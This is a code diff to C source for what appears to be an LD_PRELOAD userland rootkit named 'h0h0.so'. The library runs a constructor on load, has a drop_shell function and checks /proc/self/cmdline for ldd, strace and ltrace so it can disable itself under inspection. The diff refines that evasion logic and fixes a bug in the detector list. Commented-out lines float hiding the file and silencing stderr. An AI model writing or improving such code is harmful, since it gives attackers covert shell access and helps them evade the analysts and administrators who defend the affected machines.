@@ -5,7 +5,7 @@
 void init(void) __attribute__((constructor));
 void fini(void) __attribute__((destructor));
 void drop_shell(int fd);
-int  watchdog(char *func);
+int  watchdog(char *name);
 
 enum libcall_refs
 {
@@ -25,6 +25,7 @@ void init(void)
     FILE *handle;
     char *caller = NULL;
     size_t len = 0;
+	bool wd_found = false;
 
     const char *libc_names[] = \
     {
@@ -36,18 +37,18 @@ void init(void)
 
     if((handle = fopen("/proc/self/cmdline", "r")))
     {
-        while(getdelim(&caller, &len, 0, handle) != -1)
+        while(getdelim(&caller, &len, 0, handle) != -1 && !wd_found)
         {
-            if(watchdog(caller))
+            if((wd_found = watchdog(caller)))
             {
             	/* system("mv h0h0.so .h0h0.so"); */        /* Silly idea? */
             	/* freopen("/dev/null", "w", stderr); */    /* {s,l}trace writes to stderr (try something else). */
-           	
+
                 puts("Watchdog found!\n");
                 lib_loaded = false;
             }
         }
-	
+
         free(caller);
         fclose(handle);
     }
@@ -81,12 +82,12 @@ void drop_shell(int fd)
     }
 }
 
-int watchdog(char *func)
+int watchdog(char *name)
 {
     size_t i, wd_size;
     const char *watchdogs[] = \
     {
-        "/usr/bin/ldd"
+        "/usr/bin/ldd",
         "strace",
         "ltrace"
     };
@@ -94,7 +95,7 @@ int watchdog(char *func)
     wd_size = sizeof watchdogs / sizeof watchdogs[0];
 
     for(i = 0; i < wd_size; i++)
-        if(strcmp(watchdogs[i], func) == 0)
+        if(strcmp(watchdogs[i], name) == 0)
             return 1;
 
     return 0;
